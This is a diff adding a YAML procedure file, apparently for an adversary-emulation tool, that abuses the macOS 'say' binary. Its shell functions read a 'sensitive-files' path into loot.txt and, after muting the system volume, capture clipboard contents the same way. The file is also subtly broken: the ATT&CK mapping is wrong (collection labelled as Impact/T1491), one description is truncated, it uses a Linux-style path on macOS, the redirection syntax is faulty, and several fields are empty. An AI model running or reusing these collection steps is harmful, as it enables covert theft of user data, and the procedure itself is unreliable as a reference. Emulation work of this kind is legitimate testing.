@@ -1,0 +1,64 @@
+procedure_name: say
+tactic: Impact
+ttp_id: T1491
+guid: 0e09388e-129d-4151-980d-eae3f7451e14
+intent: Convert text to audible speech. Sourced from LOOBins; confirm MITRE mapping
+  for each enabled option.
+author: Pinar Sadioglu (@p_sadioglu)
+created: '2023-11-17'
+updated: '2026-05-03'
+version: 1.0.4
+platform:
+- darwin
+detection: []
+resources:
+- link: https://www.loobins.io/
+  description: "LOOBins \u2014 Living Off The Orchard macOS binaries"
+- link: https://attack.mitre.org/techniques/T1491/
+  description: "MITRE ATT&CK \u2014 T1491"
+- link: ''
+  description: ''
+- link: https://ss64.com/osx/say.html
+  description: say man page
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --read-sensitive-data
+    description: The following command can read and process sensitive files and redirects
+      the output to a file..
+    execute_function:
+    - execute_read_sensitive_data
+  - option: --collect-clipboard-data
+    description: The command is designed to enhance privacy by muting the system volume,using
+      a less recognizable "Wh
+    execute_function:
+    - execute_collect_clipboard_data
+  global_variable:
+  - name: CMD_SAY
+    type: string
+    default_value: /usr/bin/say
+  functions:
+  - name: execute_read_sensitive_data
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_read_sensitive_data() {\n    local result\n    result=$(say -f\
+      \ /home/user/sensitive-files -i  > loot.txt; 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\\
+      n\" \"$result\"\n    return 0\n}"
+  - name: execute_collect_clipboard_data
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_collect_clipboard_data() {\n    local result\n    result=$(osascript\
+      \ -e 'set volume output muted true' ;   say $(pbpaste) -i  > loot.txt; 2>&1)\n\
+      \    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
